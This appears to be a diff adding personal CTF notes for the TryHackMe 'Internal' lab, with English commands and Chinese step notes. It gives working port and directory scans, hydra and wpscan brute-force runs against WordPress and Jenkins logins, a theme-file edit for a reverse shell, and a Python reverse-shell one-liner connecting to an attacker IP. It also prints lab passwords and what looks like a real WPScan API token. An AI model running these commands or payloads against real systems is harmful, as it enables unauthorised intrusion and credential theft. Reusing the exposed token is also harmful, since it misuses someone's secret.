@@ -1,0 +1,36 @@
+nmap -sC -sV 10.10.103.154 -Pn > nmap.txt
+nmap -p- 10.10.103.154 > nmapall.txt
+
+gobuster dir  -u http://10.10.103.154/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+gobuster dir  -u http://10.10.103.154/blog/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobusterblog.txt
+
+
+wpscan --url http://internal.thm/blog/ --disable-tls-checks --enumerate vp --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
+
+
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.103.154 http-post-form "/blog//wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=http://internal.thm/blog/wp-admin/&testcookie=1:incorrect"
+
+
+wpscan --url internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+
+1.nmap 及gobuster找到 /blog是wordpress服務
+2.找到後台帳號是admin,使用wpscan破解出密碼my2boys
+wpscan --url internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+3.發現有theme twentyseventeen,可以修改theme中設置404頁面,修改php內容
+4.訪問404頁面,可以取得reverse shell
+http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+5.在opt下可以找到用戶帳號密碼
+aubreanna:bubb13guM!@#123
+6.使用ssh tunel將遠方8080端口綁定到本機8081
+ssh -L8081:localhost:8080 aubreanna@internal.thm
+7.因為jenkins登入是使用token驗證跳轉,無法辨別返回內容,無法使用hydra
+hydra -l 'admin' -P /home/kali/timmy/TryHackMe/Internal/rockyoufirst5000.txt 127.0.0.1 http-post-form "/j_acegi_security_check:log=j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Location:Invalid"
+8.使用zay暴力破解,根據返回字串長度來確定是否密碼正確
+spongebob
+9.登入jenkins使用python取得reverse shell
+10.在opt下找到帳號密碼root:tr0ub13guM!@#123
+
+
+export RHOST="10.9.0.204";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+ssh william@10.10.103.154
